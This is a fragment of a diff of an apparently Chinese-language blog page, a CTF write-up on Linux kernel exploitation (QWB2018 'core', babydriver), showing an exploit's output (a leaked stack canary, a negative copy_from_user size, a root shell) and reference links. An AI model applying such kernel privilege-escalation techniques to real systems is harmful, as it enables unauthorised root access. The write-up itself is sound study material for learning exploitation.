+<span class="o">[</span>*<span class="o">]</span><span class="nb">read</span> to buf.
+<span class="o">[</span>+<span class="o">]</span>canary: 0x6be486f377bb8600
+<span class="o">[</span>*<span class="o">]</span>copy from user with size: -65280
+/ <span class="c1"># id
+</span><span class="c1"></span><span class="nv">uid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span></code></pre></td></tr></table>
+</div>
+</div>
+<p>当然这个题目也有其他做法，下篇再分析。</p>
+
 <h2 id="reference-and-thanks-to">Reference and Thanks to</h2>
 
 <p>Linux Manual Pages</p>
@@ -1379,6 +2869,12 @@ exploit
 <p><a href="http://muhe.live/2017/07/13/babydriver-writeup/">http://muhe.live/2017/07/13/babydriver-writeup/</a></p>
 
 <p><a href="https://xz.aliyun.com/t/2306">https://xz.aliyun.com/t/2306</a></p>
+
+<p><a href="https://unix.stackexchange.com/questions/5518/what-is-the-difference-between-the-following-kernel-makefile-terms-vmlinux-vml">https://unix.stackexchange.com/questions/5518/what-is-the-difference-between-the-following-kernel-makefile-terms-vmlinux-vml</a></p>
+
+<p><a href="https://blog.csdn.net/gatieme/article/details/78311841">https://blog.csdn.net/gatieme/article/details/78311841</a></p>
+
+<p><a href="https://veritas501.space/2018/06/05/qwb2018%20core/">https://veritas501.space/2018/06/05/qwb2018%20core/</a></p>
     </div>
 
     
